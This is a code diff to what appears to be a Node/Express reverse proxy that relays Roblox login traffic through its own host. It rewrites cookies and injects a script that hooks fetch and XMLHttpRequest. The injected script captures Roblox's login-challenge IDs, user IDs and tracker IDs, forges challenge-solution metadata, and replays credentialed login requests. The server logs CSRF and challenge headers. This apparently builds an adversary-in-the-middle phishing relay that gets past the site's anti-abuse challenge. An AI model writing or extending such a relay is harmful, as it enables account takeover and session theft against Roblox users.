@@ -61,11 +61,7 @@ const CHALLENGE_HEADERS = [
     'rblx-challenge-id',
     'rblx-challenge-type',
     'rblx-challenge-metadata',
-    'rblx-challenge-solution',
-    'rbx-challenge-id',
-    'rbx-challenge-type',
-    'rbx-challenge-metadata',
-    'rbx-challenge-solution',
+    'x-retry-attempt',
 ];
 
 function rewriteCookies(cookies, host) {
@@ -153,7 +149,7 @@ function doLoginRequest(bodyStr, cookieHeader, csrfToken, ua, extraHeaders) {
         if (cookieHeader) headers['Cookie'] = cookieHeader;
         if (csrfToken)    headers['X-CSRF-TOKEN'] = csrfToken;
 
-        const hasChallengeSolution = !!(extraHeaders['rblx-challenge-solution'] || extraHeaders['rbx-challenge-solution']);
+        const hasChallengeSolution = !!(extraHeaders['rblx-challenge-metadata'] && extraHeaders['rblx-challenge-id']);
         console.log(`   → POST auth.roblox.com/v2/login | CSRF: ${csrfToken ? csrfToken.slice(0,8)+'...' : 'none'} | Cookie: ${cookieHeader ? 'yes' : 'none'} | Challenge: ${hasChallengeSolution ? 'YES' : 'NO'}`);
 
         const options = {
@@ -195,8 +191,8 @@ app.use('/auth-api/v2/login', express.raw({ type: '*/*' }), async (req, res) => 
     const deviceId = getDeviceId(req);
 
     // Check if this is a challenge retry from browser
-    const hasChallengeSolution = req.headers['rblx-challenge-solution'] || req.headers['rbx-challenge-solution'];
-    const hasChallengeId = req.headers['rblx-challenge-id'] || req.headers['rbx-challenge-id'];
+    const hasChallengeSolution = !!(req.headers['rblx-challenge-metadata'] && req.headers['rblx-challenge-id']);
+    const hasChallengeId = req.headers['rblx-challenge-id'];
     console.log(`🔑 LOGIN | Challenge solution from browser: ${hasChallengeSolution ? 'YES' : 'NO'} | Challenge ID: ${hasChallengeId ? 'YES' : 'NO'}`);
 
     // Debug: Log all challenge-related headers
@@ -210,6 +206,19 @@ app.use('/auth-api/v2/login', express.raw({ type: '*/*' }), async (req, res) => 
 
     try {
         const bodyStr = req.body.toString('utf8');
+
+        // Debug: Log all incoming headers for login requests
+        if (req.path === '/auth-api/v2/login') {
+            const relevantHeaders = {};
+            for (const [k, v] of Object.entries(req.headers)) {
+                if (k.includes('challenge') || k.includes('csrf') || k.includes('rbx')) {
+                    relevantHeaders[k] = typeof v === 'string' ? v.substring(0, 50) : v;
+                }
+            }
+            if (Object.keys(relevantHeaders).length > 0) {
+                console.log('   Incoming headers:', relevantHeaders);
+            }
+        }
 
         // If browser sent challenge solution, forward directly to Roblox
         if (hasChallengeSolution) {
@@ -326,11 +335,6 @@ function forwardResponse(res, response, host, origin, deviceId) {
         'rblx-challenge-id',
         'rblx-challenge-type', 
         'rblx-challenge-metadata',
-        'rblx-challenge-solution',
-        'rbx-challenge-id',
-        'rbx-challenge-type', 
-        'rbx-challenge-metadata',
-        'rbx-challenge-solution',
         'content-type',
         'cache-control',
     ];
@@ -384,25 +388,150 @@ function buildInjectedScript(host) {
         }
         return url;
     }
+
+    // Store challenge data for retry
+    window.__rblxChallengeId = null;
+    window.__rblxChallengeType = null;
+    window.__rblxUserId = null;
+    window.__rblxBrowserTrackerId = null;
+    window.__rblxChallengeSolved = false;
+
+    function log(msg, data) {
+        console.log('[Proxy]', msg, data || '');
+    }
+
+    // Helper to construct solution metadata
+    function constructSolutionMetadata() {
+        if (!window.__rblxChallengeId || !window.__rblxUserId) return null;
+        var data = {
+            userId: window.__rblxUserId,
+            challengeId: window.__rblxChallengeId,
+            browserTrackerId: window.__rblxBrowserTrackerId || ''
+        };
+        return btoa(JSON.stringify(data));
+    }
+
     var _fetch = window.fetch;
     window.fetch = function(resource, init) {
-        if (typeof resource === 'string') resource = rewriteUrl(resource);
-        else if (resource && resource.url) resource = new Request(rewriteUrl(resource.url), resource);
+        var url = typeof resource === 'string' ? resource : resource.url;
+        var rewrittenUrl = rewriteUrl(url);
+        if (typeof resource === 'string') resource = rewrittenUrl;
+        else if (resource && resource.url) resource = new Request(rewrittenUrl, resource);
         init = init || {};
         init.credentials = 'include';
-        return _fetch.call(this, resource, init);
+
+        // Add challenge headers if challenge is solved (for retry)
+        if (window.__rblxChallengeSolved && window.__rblxChallengeId) {
+            var solutionMetadata = constructSolutionMetadata();
+            if (solutionMetadata && (url.includes('/v2/login') || url.includes('auth'))) {
+                init.headers = init.headers || {};
+                init.headers['rblx-challenge-id'] = window.__rblxChallengeId;
+                init.headers['rblx-challenge-type'] = window.__rblxChallengeType || 'chef';
+                init.headers['rblx-challenge-metadata'] = solutionMetadata;
+                init.headers['x-retry-attempt'] = '1';
+                log('Adding challenge solution headers to retry', {id: window.__rblxChallengeId});
+            }
+        }
+
+        return _fetch.call(this, resource, init).then(function(response) {
+            // Clone response to read body for challenge/continue
+            var clonedResponse = response.clone();
+
+            // Capture challenge headers from responses (when challenge is required)
+            var challengeId = response.headers.get('rblx-challenge-id');
+            var challengeType = response.headers.get('rblx-challenge-type');
+            var challengeMetadata = response.headers.get('rblx-challenge-metadata');
+
+            if (challengeId && challengeMetadata) {
+                log('Challenge required:', {id: challengeId, type: challengeType});
+                window.__rblxChallengeId = challengeId;
+                window.__rblxChallengeType = challengeType;
+                window.__rblxChallengeSolved = false;
+                // Parse metadata to get userId and browserTrackerId
+                try {
+                    var metaStr = atob(challengeMetadata);
+                    var meta = JSON.parse(metaStr);
+                    window.__rblxUserId = meta.userId;
+                    window.__rblxBrowserTrackerId = meta.browserTrackerId;
+                    log('Extracted from metadata:', {userId: meta.userId, browserTrackerId: meta.browserTrackerId});
+                } catch(e) {}
+            }
+
+            // Check if this is challenge/v1/continue success
+            if (url.includes('challenge/v1/continue') && response.status === 200) {
+                log('Challenge continue succeeded, marking as solved');
+                window.__rblxChallengeSolved = true;
+            }
+
+            return response;
+        });
     };
+
     var _open = XMLHttpRequest.prototype.open;
     XMLHttpRequest.prototype.open = function(method, url) {
         var args = Array.prototype.slice.call(arguments);
         args[1] = rewriteUrl(url);
+        this.__rblxUrl = args[1];
         return _open.apply(this, args);
     };
+
+    var _setRequestHeader = XMLHttpRequest.prototype.setRequestHeader;
+    XMLHttpRequest.prototype.setRequestHeader = function(header, value) {
+        this.__rblxHeaders = this.__rblxHeaders || {};
+        this.__rblxHeaders[header.toLowerCase()] = value;
+        return _setRequestHeader.call(this, header, value);
+    };
+
     var _send = XMLHttpRequest.prototype.send;
-    XMLHttpRequest.prototype.send = function() {
+    XMLHttpRequest.prototype.send = function(body) {
         this.withCredentials = true;
+
+        // Add challenge headers if challenge is solved (for retry)
+        if (window.__rblxChallengeSolved && window.__rblxChallengeId) {
+            var solutionMetadata = constructSolutionMetadata();
+            if (solutionMetadata && this.__rblxUrl && (this.__rblxUrl.includes('/v2/login') || this.__rblxUrl.includes('auth'))) {
+                if (!this.__rblxHeaders || !this.__rblxHeaders['rblx-challenge-metadata']) {
+                    _setRequestHeader.call(this, 'rblx-challenge-id', window.__rblxChallengeId);
+                    _setRequestHeader.call(this, 'rblx-challenge-type', window.__rblxChallengeType || 'chef');
+                    _setRequestHeader.call(this, 'rblx-challenge-metadata', solutionMetadata);
+                    _setRequestHeader.call(this, 'x-retry-attempt', '1');
+                    log('Adding challenge solution headers to XHR retry', {id: window.__rblxChallengeId});
+                }
+            }
+        }
+
+        var self = this;
+        var originalOnReadyStateChange = this.onreadystatechange;
+        this.onreadystatechange = function() {
+            if (self.readyState === 4) {
+                var challengeId = self.getResponseHeader('rblx-challenge-id');
+                var challengeType = self.getResponseHeader('rblx-challenge-type');
+                var challengeMetadata = self.getResponseHeader('rblx-challenge-metadata');
+                if (challengeId && challengeMetadata) {
+                    log('XHR Challenge required:', {id: challengeId, type: challengeType});
+                    window.__rblxChallengeId = challengeId;
+                    window.__rblxChallengeType = challengeType;
+                    window.__rblxChallengeSolved = false;
+                    try {
+                        var metaStr = atob(challengeMetadata);
+                        var meta = JSON.parse(metaStr);
+                        window.__rblxUserId = meta.userId;
+                        window.__rblxBrowserTrackerId = meta.browserTrackerId;
+                    } catch(e) {}
+                }
+                // Check if this is challenge/v1/continue success
+                if (self.__rblxUrl && self.__rblxUrl.includes('challenge/v1/continue') && self.status === 200) {
+                    log('XHR Challenge continue succeeded, marking as solved');
+                    window.__rblxChallengeSolved = true;
+                }
+            }
+            if (originalOnReadyStateChange) return originalOnReadyStateChange.apply(this, arguments);
+        };
+
         return _send.apply(this, arguments);
     };
+
+    log('Proxy interceptor loaded');
 })();
 </script>`;
 }
